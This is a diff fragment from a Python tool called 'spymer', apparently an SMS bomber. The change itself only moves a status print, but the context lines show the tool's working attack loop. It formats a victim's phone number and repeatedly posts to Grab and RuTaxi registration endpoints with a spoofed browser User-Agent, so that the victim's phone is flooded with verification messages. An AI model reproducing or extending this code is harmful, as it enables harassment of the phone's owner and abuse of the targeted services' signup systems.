@@ -52,10 +52,10 @@ class spymer:
 		_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11] # '+7 (915) 350 99 08'
 		_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '915) 350-99-08'
 		print(showstatus(wrapsbrace('info', True) + ('Телефон: +{}').format(_phone)))
-		print(showstatus(wrapsbrace('info', True) + ('Отправленно: +{}').format(iteration)))
 		i = 1
 		iteration = 0
 		while i < 10:
+			print(showstatus(wrapsbrace('info', True) + ('Отправленно: {}').format(iteration)))
 			_email = _name+f'{iteration}'+'@gmail.com'
 			grab = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
 			rutaxi = requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
